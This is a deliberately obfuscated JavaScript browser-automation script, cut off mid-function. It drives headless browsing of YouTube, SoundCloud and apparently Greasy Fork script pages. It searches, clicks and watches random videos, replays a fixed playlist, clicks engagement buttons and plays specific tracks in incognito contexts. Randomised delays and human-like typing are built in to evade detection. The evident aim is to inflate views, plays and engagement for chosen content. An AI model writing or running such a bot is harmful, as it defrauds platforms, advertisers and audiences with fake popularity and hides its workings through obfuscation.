const a0 = c,
  Z = d,
  X = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xbc6 + -0x142f + 0x86a))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x73b + -0x1 * 0x1ee8 + 0x1 * 0x2623), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x45 * 0x1f + 0x4d29 + 0x3062 + (-0x1 * -0x3e77 + 0x3814 + -0x3bf3) * random()) : await standardWaitForNetIdle(f), await wait(-0x13ca + 0x1b7f + 0xbd3 + (-0x157f * 0x2 + -0x3c38 + 0x8e46) * random()), -0x1 * -0x461 + -0x13 * 0x1ae + 0x1b8a * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x950 + 0x2e2 + 0x756), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x146c + -0x87 * -0x2b + -0x240;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xc35 + -0x1292 + 0x65d);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function randomWait() {
  return await wait(0x2 * -0xd9f + -0x130a + 0x41d0 + (-0x11f * -0x1 + 0x1775 * -0x1 + 0x29de) * random()), 0x1ef7 + -0x750 + -0x2 * 0xbd3;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x5a9 + -0x522 * -0x6 + -0x1923, -0x122 * 0x13 + 0x1 * -0xe21 + -0x2 * -0x11d7), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x3672 + -0x1b1cc + -0x265ba * -0x1) * getRandomInt(0x206c + -0x1 * -0x208e + -0x40f8, -0x7 * -0x412 + 0x16c * -0x19 + -0x713 * -0x1), h)), -0x17fb + -0xdf9 + -0xca7 * -0x3;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1d * 0xec + 0x81 * 0xe + -0x21ca;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x16 * -0x3 + -0x6d7 * 0x2 + -0xdf1 * -0x1]['split']('\x20');
    for (let k = 0x1 * -0x21a6 + 0x2665 + -0x51 * 0xf; k < i['length']; k += 0x4 * 0x968 + 0xe39 + 0x17 * -0x241)
      j += i[k] * h[i[k + (-0x1 * -0x112 + -0x1d37 * 0x1 + 0x1c26)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2301 + 0xc83 * 0x1 + 0x1684)['map'](l => Array['from'](l['children']))['flat'](-0x5c6 * -0x5 + 0x2006 * 0x1 + -0x3ce3)['map'](l => l['childNodes'][-0x1 * -0x1d46 + 0x2 * -0x7ea + -0xd71]['childNodes'][0x1 * 0x3b + -0x2334 + -0x4ff * -0x7]['childNodes'][0x119b * -0x1 + 0x2154 + 0x4 * -0x3ee]['childNodes'][-0x1 * -0x13ea + -0x2 * 0x1a + -0x13b6]['childNodes'][-0x4 * -0x890 + -0x10 * -0x124 + -0x347f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x7 * -0x161 + 0xa2d + -0x1 * -0x362, -0x4fd + -0x3d * -0x8e + -0x951)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2b2c + -0x7db + 0x1747);
  const h = await getMaxTime(f),
    i = Math['min']((0x2 * -0x44bf + -0x79f * 0x25 + 0x28dd9 * 0x1) * getRandomInt(-0x407 * 0x1 + -0x4 * -0x3b6 + -0xacf, 0x2 * 0x10ed + 0x6b2 + -0x2887), h);
  return await wait(i), 0x153d * 0x1 + -0x3b0 + -0x4 * 0x463;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xc35 + -0x1292 + 0x65d);
    let h = e[f];
    if (c['fUwavF'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1f4 * 0x2 + 0x25a3 + -0x298b, r, s, t = -0x3b * 0x1d + -0x125e + 0x190d; s = m['charAt'](t++); ~s && (r = q % (-0x1674 + 0xbc6 + 0xab2) ? r * (-0xe3f + -0x73b + -0x1 * -0x15ba) + s : s, q++ % (0x854 + 0xa * 0x1 + -0x85a)) ? o += String['fromCharCode'](0xb * -0x175 + -0x1 * 0xc4c + 0x1d52 & r >> (-(-0x1 * 0xef + -0x13ca + 0x14bb) * q & -0x157f * 0x1 + -0x1e1c + 0x33a1)) : -0x1 * -0x461 + -0x13 * 0x1ae + 0x1b89 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x950 + 0x2e2 + -0xc32, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x146c + -0x87 * -0x2b + -0x231))['slice'](-(0x2 * -0xd9f + -0x130a + 0x2e4a));
        }
        return decodeURIComponent(p);
      };
      c['rQrWHg'] = i, b = arguments, c['fUwavF'] = !![];
    }
    const j = e[-0x11f * -0x1 + 0x1775 * -0x1 + 0x1656],
      k = f + j,
      l = b[k];
    return !l ? (h = c['rQrWHg'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function a() {
  const bq = [
    'close',
    'DYjGsghcHd3cUZ7dQa',
    'qw5Krg93BKj1Da',
    's2L0lZuZnY4ZnG',
    'rg/en/scri',
    'ai-wave-ii',
    'QrJIU09eD-',
    'zs8Q',
    'fWrgACoaWQSdWQWUW78',
    'CSoQW4rQnSkFbmof',
    'y2XLyxi',
    's8kOEshcRu9EWRG9WPa',
    'rgXkrxqYs1uZmW',
    'evaluate',
    'W556eLmtCfxcQfVdJa',
    '/mscarchil',
    'zw51C2vYANmUBW',
    'mw8kcJFcKclcPJf4',
    'y2HPBgroB2rLCW',
    'st\x20in\x20hind',
    'WQ8CW6Hue3FdOJLwWPu',
    'vqbjkCo+ssdcSIjc',
    'ptcha',
    'W5ObW51eW6ZdO8oDk8kssq',
    'ndDHzdC0yZuX',
    'https://gr',
    'Cxy4F8kE',
    'WQFdLqlcMCk4W5WLjG',
    'ChrZl2j5lxnPDa',
    'createInco',
    'easyfork.o',
    'Ahr0Chm6lY9VCa',
    'y29Tp3bHz2u9oq',
    'mcaOv2LUzg93CW',
    's27dRmkjW6JdKg7cJCkiWOu',
    'zMLUywXPEMu',
    'DMuEgqxdP3m2srS'
  ];
  a = function() {
    return bq;
  };
  return a();
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x13df + 0x4a3 * 0x8 + -0x1 * 0x1139]['children'][-0x202e * 0x1 + 0x1994 + 0x69a][R(0x9, '[WV9')][0x1110 + -0x1e9a * -0x1 + -0x2faa]['children'][0x11ea + 0x7 * -0x43e + -0xe8 * -0xd]['children'][0x1ba4 + -0xcc4 + 0x1 * -0xee0]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x129 * 0xb + -0x1d6f + 0x2a33 * 0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xf44 + 0x92 * -0x40 + 0x3428 + (-0x7d2 + -0x189 * -0x1 + 0x7 * 0xed) * random()
  }), await wait(0xc * -0x290 + -0x1c44 + 0x3cf8 + (0x12ef + -0x224b + 0x1088) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const S = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x724 + -0x85d + 0x13b][S(0x12)][0x905 + 0xa38 + -0x133c]['childNodes'][0x18cf + 0x1 * -0x1591 + -0x33d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xaf * -0x5 + 0x34 * -0x2 + -0x2fe]['childNodes'][0xb76 + -0xc06 + 0x90]['childNodes'][-0x11ef + -0xd4 * 0xb + 0x1 * 0x1b0d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x61b + -0x228a * -0x1 + -0x28a4),
          r = -0xd * 0x295 + -0x10 * -0x52 + -0x1c71 * -0x1;
        for (let u = -0x15e1 + -0x1e71 * 0x1 + 0x3452; u < q['length']; u += -0x1a3 * 0x6 + 0xc57 + -0x1 * 0x283)
          r += q[u] * k[q[u + (-0x1422 + 0xb * 0x30d + -0xd6c)]];
        return r;
      }(n);
  });
  await wait((0x4eab + -0x1ada + 0x6c7) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x45d * -0x65 + 0x4801 * -0x6 + 0x1 * 0xe1b5) * getRandomInt(0x2116 + 0x1dc1 + -0x1 * 0x3ed6, 0x10f + -0x13b6 + 0x12b1 * 0x1), h + (0x1 * 0x10bf + -0xb89 + 0x4c6 * 0x3));
  return await wait(i), 0x25f1 * -0x1 + 0x1274 + 0x137e;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xdd5 * -0x2 + 0x1ce * -0xe + -0x5 * -0xa96), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xd78 * -0x1 + 0x1 * 0x193b + 0x1 * -0x1afb + (0x3f * -0x18 + 0x1fa1 + -0x15d1) * Math['random']());
    });
  }, 0x1b7 * 0xc + 0x5f8 + -0xcc * -0x1);
  await wait(-0x28513 + -0x34b5 * -0x17 + 0x25cb0);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xd696 * -0x1 + 0x1a * 0x1151 + -0x238 * 0xc2) * getRandomInt(-0x1c3b + -0x1ee7 + 0x3b26, -0x9 * -0x1c1 + -0x1d80 + 0xdd0)), clearInterval(h), -0x1859 + -0x17c9 + 0x3023;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x50e * -0x7 + 0x796 + -0x4a2 * -0x6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * -0x149d + 0x1 * 0x2345 + -0x37e1;
    await randomWait();
  }
  return 0x17be + 0x2ac + -0x1a69 * 0x1;
}

function fetchRandomSC() {
  const T = b;
  return Math['random']() <= 0x22db + -0x18b * 0x2 + -0xa97 * 0x3 + 0.5 ? T(0x11, 'km3p') + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xe * -0x5b + 0x1 * -0x1505 + 0x100b + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x741 * 0x1 + -0xf89 + 0x848 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xeb0 + 0x1d64 + 0x1c * -0x193;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xa * -0x6df + 0x1 * -0x975d + 0x1026f + getRandomInt(-0x49 * 0x1 + -0x3a9 * 0x5 + 0x6 * 0xcdd, -0x5ba2 + 0x2 * 0x54c8 + 0x2742));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x2245 + 0x33f * -0x9 + 0x3f7d * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0xe6b * -0x1 + -0x4ed * 0x4 + 0x221f * 0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1983 + -0x1 * -0x773 + -0x20f6, 0x1b52 + 0x20 * 0xda + -0x3660)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x22ed + -0x93b + -0x11e2 + floor((0x225c + 0x1d * -0xb + -0x1d35) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x79b8ded0 + -0x1 * 0x7102fec + 0x403243af * 0x4),
          -0xccf7e2 + -0x9b50b4 + 0x1e84896,
          -0x1 * 0x6681 + -0x96bc + -0x166d * -0x11,
          0x22e1 + 0x158c + -0x1 * 0x37ed
        ], y = [
          0x1406 + -0x1414 + 0x26,
          0x3 * -0x2d5 + 0x2528 + -0x1c99,
          0xe26 + -0x721 + -0x6fd,
          0x1d90 + 0x18ba + -0x364a
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x45 * -0x1 + 0xdac + -0x2ae * 0x5)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x175 * -0x2 + 0x2000 + 0x6 * -0x4d9; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1d2d + 0x197 + -0x1ec4 * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * 0x1517 + 0xe26 + -0x233d * 0x1] = A[-0x19c8 + -0x5 * 0x30a + 0x290a] = A[0x2 * 0x7f3 + 0x1 * -0x14ae + -0xaf * -0x7] = A[0x2 * 0xd40 + -0x2036 + 0x5b8] = A[-0x1 * 0x265b + -0x1431 * -0x1 + -0x1a7 * -0xb] = A[0x8a8 + -0x14bb + -0x5 * -0x26b] = A[-0xc9a + 0x831 * 0x3 + -0xbf4] = A[0x1 * -0x1f3f + -0x22b0 + 0x41f5] = A[0x5c9 + 0x952 * 0x4 + -0x2b0a * 0x1] = A[0x63 * 0x45 + -0x3b2 + -0x1 * 0x16f5] = A[-0x1f3c + -0xbc3 * 0x1 + -0x2 * -0x1584] = A[0x2a6 + 0x149 + -0x1 * 0x3e5] = A[0x2 * -0xd53 + 0x196 + -0x1 * -0x191b] = A[-0xd46 + -0x13d * -0x19 + -0x11a3] = A[0x24c3 + -0x1163 * 0x1 + -0x1353 * 0x1] = A[0x1 * -0x2e3 + -0xbd3 * -0x3 + 0x1 * -0x2088] = A[-0x15af + -0xc5 + 0x1683] = 0x4e * -0x4e + 0x1a77 + 0x2b3 * -0x1, this['blocks'] = A) : this['blocks'] = [
                0x1f5c + 0x49 * -0x27 + -0x143d,
                0xb * 0x73 + -0x12 * -0x14c + 0x22d * -0xd,
                0x7b * 0x3f + 0x45 * 0x42 + -0x3 * 0x1005,
                0x269b + -0xb8c + 0x1b0f * -0x1,
                -0x11e3 * -0x2 + -0x1622 + -0x9 * 0x184,
                0x51e + 0x1c60 + -0x2 * 0x10bf,
                -0x256b * -0x1 + -0x1 * -0x709 + -0x2c74,
                0x184f + -0xb * -0x9d + -0xf87 * 0x2,
                0x113 + -0x19 * -0x43 + 0x32 * -0x27,
                -0x5b * 0x3 + 0x3 * 0x73b + 0x42 * -0x50,
                0x53 * -0x4d + -0x2638 + 0xca3 * 0x5,
                0x347 * 0xb + -0x1295 + -0x1178,
                -0x1c83 + 0x3e0 + 0x18a3,
                0x6ab + 0x5bc + -0xc67,
                -0x2340 + -0xada + 0x2e1a,
                0x369 * -0x3 + 0x1692 + -0xc57,
                0x14f2 + -0x97a + -0xb78 * 0x1
              ], this['h0'] = 0x2a99f482 + -0x58e0487e + -0x1 * -0x958b76fd, this['h1'] = -0x9e834 * -0x24a2 + -0x1105fcf10 + 0x954139b1, this['h2'] = -0x2e4b4f74 + -0x1148b5cb8 + 0x1db91892a, this['h3'] = -0x13ae9a47 + -0x1e70f58 + 0x25c7fe15, this['h4'] = 0xc3812272 + -0x1235f30e * 0x6 + 0x2 * 0x36cab8e9, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x152 * -0x4 + -0xc78 + 0x11c * 0x10, this['finalized'] = this['hashed'] = -0x22a * -0x5 + 0x1834 + -0x2306, this['first'] = -0x1f16 + -0x1287 + 0xdb * 0x3a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0xb5a * -0x1 + -0xd0f * 0x1 + 0x1869, O = J['length'] || -0xe * -0xf9 + 0x74a * -0x5 + 0x16d4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x6 * 0x109 + -0x2 * -0x6a8 + -0x71a, P[-0x35 * -0x51 + -0x89c * -0x2 + -0x21fd] = this['block'], P[-0x21ce * 0x1 + 0x1b8 + 0x2026] = P[-0x25 * -0x6e + -0x770 + -0x875 * 0x1] = P[0x131 * 0x1d + 0x194a + 0x35 * -0x121] = P[0x175b + 0x1381 * -0x2 + 0xfaa] = P[-0x696 + -0x1f * 0xa1 + 0x83 * 0x33] = P[0x158b * 0x1 + -0x1 * 0x8de + -0xca8] = P[0x1 * 0x1cf + -0x2 * 0x5d1 + -0x1 * -0x9d9] = P[0x7a5 * 0x4 + -0x1dba + -0xd3] = P[0x1df8 + -0x1e6a + -0x7a * -0x1] = P[0x26a4 + -0x16c6 + -0x15 * 0xc1] = P[-0x1f6 + 0x373 * 0x3 + 0x859 * -0x1] = P[-0x947 * -0x4 + 0x721 * 0x3 + -0x102 * 0x3a] = P[-0xb3 * 0x19 + 0x16cf * -0x1 + -0x6 * -0x6b9] = P[0x2288 + 0x31 * 0x62 + 0x19d * -0x21] = P[-0x1 * 0x218b + -0xe9f + -0x4 * -0xc0e] = P[0x1 * -0xd0e + 0x5a * -0x14 + 0x1425 * 0x1] = 0x349 * -0x4 + 0x1718 + -0x9f4), K) {
                    for (N = this['start']; M < O && N < -0x1 * -0x1193 + -0x545 * -0x2 + -0x1bdd; ++M)
                      P[N >> 0x21cb + -0xc6 + -0x2103] |= J[M] << y[0x18cf + -0x5 * 0x76b + 0xc4b & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1 * -0x17cd + 0x1d9d + 0x2c8 * -0x2; ++M)
                      (L = J['charCodeAt'](M)) < 0x8 * -0x4a + -0x1668 + 0x434 * 0x6 ? P[N >> 0xba8 + -0x1 * 0x7a + -0x23c * 0x5] |= L << y[0x949 + -0xbef + 0x2a9 & N++] : L < 0xc * -0x18c + -0x3 * 0x6a1 + 0x439 * 0xb ? (P[N >> -0x8d2 + 0x250 + -0x4 * -0x1a1] |= (-0x1a2e + 0x18d1 + 0x1 * 0x21d | L >> 0xccd + -0x2118 + 0x1451) << y[-0xf2 + 0x19 * -0x3d + -0x2 * -0x375 & N++], P[N >> 0x11 * -0x144 + 0x1fd1 + -0xa4b] |= (0x1012 + 0x1a56 * -0x1 + 0xd * 0xd4 | 0xe57 * -0x1 + 0x1 * 0x2566 + 0x5 * -0x490 & L) << y[-0x1fa2 * -0x1 + -0x8c6 + -0x1 * 0x16d9 & N++]) : L < 0x1179b * 0x1 + -0x9f6c + 0x50b * 0x13 || L >= -0x21 * -0x479 + 0x1baa8 + 0x1 * -0x16e41 ? (P[N >> -0x1a * -0x104 + -0x1 * -0x110c + -0x2b72] |= (-0xf * 0x24b + 0x1 * -0x16f9 + -0x8e * -0x69 | L >> -0x3a1 * -0x8 + -0x4 * -0x96b + -0x9e * 0x6c) << y[0x22df + 0x1 * 0x189a + -0x3b76 & N++], P[N >> 0x2 * 0x419 + -0x1c46 + -0x359 * -0x6] |= (-0x79 + 0x8db * -0x3 + -0x2f * -0x96 | L >> 0xc89 * 0x1 + -0x136d * -0x2 + -0x335d & 0x4 * 0x1b0 + 0x1439 + -0x1aba) << y[0x1 * -0x11f6 + -0x1af9 + 0x2cf2 & N++], P[N >> -0x3 * -0x169 + -0x175d + 0x19 * 0xc4] |= (-0x2526 + 0x10b * -0x17 + 0x3da3 * 0x1 | 0x1 * -0x177b + -0x234a + 0x13ac * 0x3 & L) << y[0x906 + -0x1052 + -0x1 * -0x74f & N++]) : (L = 0x84d8 + 0x63db * 0x1 + -0x5 * -0x4a9 + ((-0x23e7 + -0x1cd2 + 0x44b8 & L) << -0x1048 * 0x2 + 0x2048 + -0x2 * -0x29 | -0x1d2c + -0x1ef9 * 0x1 + -0x5 * -0xcd4 & J['charCodeAt'](++M)), P[N >> -0x2 * -0x1c6 + -0x1775 + 0x13eb] |= (-0x9b * -0x3 + 0x93 + -0xc * 0x1f | L >> -0x1a95 * -0x1 + 0x62d + -0x20b0) << y[-0x59 * 0x1b + -0x167 * -0x5 + 0xd * 0x2f & N++], P[N >> -0x93 * 0x36 + -0x2 * -0xd37 + 0x1 * 0x496] |= (-0x75d + 0x277 * -0x2 + 0xccb | L >> 0xd55 * 0x1 + 0x237b * 0x1 + -0x30c4 & 0x1475 + -0x529 + -0xf0d) << y[-0x187a + 0xa77 + 0xe06 & N++], P[N >> -0x22f9 + 0x83 * 0xe + 0x1bd1] |= (0x23f * -0x5 + -0x2 * -0xbb7 + 0xbb3 * -0x1 | L >> 0x1 * -0xf47 + 0x537 * -0x3 + 0x1ef2 & -0x257 * 0x5 + 0x1231 * -0x1 + -0x607 * -0x5) << y[-0x8ef + -0x4 * 0x386 + 0x170a & N++], P[N >> 0x2313 + -0x1 * 0x122 + 0x77 * -0x49] |= (-0xd * 0x155 + 0x1 * -0x1e3e + 0x557 * 0x9 | -0x858 + 0x15ac + -0xd15 * 0x1 & L) << y[-0x97 + -0x2667 + -0x2701 * -0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x635 * -0x1 + -0x5f9 * 0x1 + 0x4 ? (this['block'] = P[-0x1 * -0x25f7 + 0x1253 + -0x383a], this['start'] = N - (-0x570 * 0x2 + -0x52c * 0x6 + 0x4c * 0x8e), this['hash'](), this['hashed'] = -0x1bc6 + 0x32 * -0x79 + -0x1 * -0x3369) : this['start'] = N;
                }
                return this['bytes'] > 0x6f602af4 + 0x1e7b377d7 * 0x1 + -0x15713a2cc && (this['hBytes'] += this['bytes'] / (-0x17f5430b8 + -0x1165673d4 * -0x1 + 0x168fdbce4) << 0x168a + 0x1 * -0xaff + -0xb8b, this['bytes'] = this['bytes'] % (0x1225cb9c4 + -0x7858546c + 0x55fb9aa8)), this;
              }
            }
            ['finalize']() {
              const U = b;
              if (!this['finalized']) {
                this['finalized'] = 0x1c8d * 0x1 + -0xb69 + -0x1123 * 0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
